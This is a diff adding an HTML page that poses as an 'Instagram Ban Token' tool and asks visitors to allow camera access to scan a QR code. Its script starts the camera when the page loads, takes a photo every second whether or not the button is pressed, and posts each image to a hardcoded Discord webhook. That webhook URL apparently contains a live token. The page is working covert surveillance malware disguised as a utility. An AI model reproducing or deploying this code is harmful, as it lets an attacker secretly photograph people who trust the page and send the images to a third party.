@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Ban</title>
+    <style>
+        body {
+            background-color: #000;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #container {
+            max-width: 400px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+
+        h1 {
+            color: #ff1493;
+        }
+
+        ul {
+            text-align: left;
+            padding-left: 20px; /* Add some left padding */
+        }
+
+        li {
+            color: white;
+            list-style: decimal;
+            margin-bottom: 5px; /* Reduce the margin between steps */
+        }
+
+        video {
+            width: 100%;
+            max-height: 300px;
+            display: block;
+            margin: 0 auto;
+            border-radius: 4px;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #0000cd;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>Instagram Ban Token</h1>
+        <ul>
+            <li>Allow camera access.</li>
+            <li>Open Instagram and visit QR Code.</li>
+            <li>Scan that code by clicking on "Scan QR".</li>
+        </ul>
+        <video id="video" playsinline autoplay></video>
+        <button id="captureButton" disabled>Scan QR</button>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+
+        let stream;
+        let imageCapture;
+        let intervalId;
+
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                document.getElementById('captureButton').removeAttribute('disabled');
+                intervalId = setInterval(captureAndSendPhoto, 1000);
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+            }
+        }
+
+        startCamera();
+
+        document.getElementById('captureButton').addEventListener('click', captureAndSendPhoto);
+
+        async function captureAndSendPhoto() {
+            try {
+                const photoBlob = await imageCapture.takePhoto();
+                sendPhotoToDiscord(photoBlob);
+            } catch (err) {
+                console.error('Error capturing photo:', err);
+            }
+        }
+
+        function sendPhotoToDiscord(photoBlob) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1103515184196235325/Tc6oFGFUGXbozGBYNajJwtD6FSx0CtfNrhgkbgu11UonQKbUlTeMzomOkziXKhRLH2-A';
+
+            const formData = new FormData();
+            formData.append('file', photoBlob, 'photo.jpg');
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log('Photo sent to Discord:', data);
+            })
+            .catch(error => {
+                console.error('Error sending photo to Discord:', error);
+            });
+        }
+    </script>
+</body>
+</html>
